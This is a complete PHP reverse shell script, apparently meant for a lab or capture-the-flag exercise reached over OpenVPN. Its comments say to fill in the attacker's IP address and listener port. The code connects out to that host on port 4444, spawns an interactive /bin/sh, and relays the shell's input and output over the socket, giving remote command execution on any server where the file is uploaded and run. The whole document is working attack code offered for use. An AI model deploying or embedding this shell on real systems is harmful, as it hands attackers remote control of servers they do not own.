<?php
#no much edits are needed to be done here, just change the IP address to the one you get after connecting to the OpenVPN server
set_time_limit(0);
$ip = 'IP ADDRESS'; #remember to change this to the IP address you have after connecting to the OpenVPN server
$port = 4444; #this is the port you want to connect with, the port you set in your listener
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit(1); }
$proc = proc_open('/bin/sh -i', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes);
if (is_resource($proc)) {
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);
  while (!feof($sock)) {
    $r = [$sock, $pipes[1], $pipes[2]];
    $n = stream_select($r, $w = null, $e = null, null);
    if (in_array($sock, $r)) {
      $input = fread($sock, 8192);
      fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $r)) {
      $output = fread($pipes[1], 8192);
      fwrite($sock, $output);
    }
    if (in_array($pipes[2], $r)) {
      $err = fread($pipes[2], 8192);
      fwrite($sock, $err);
    }
  }
  fclose($sock);
  fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
  proc_close($proc);
}
?>
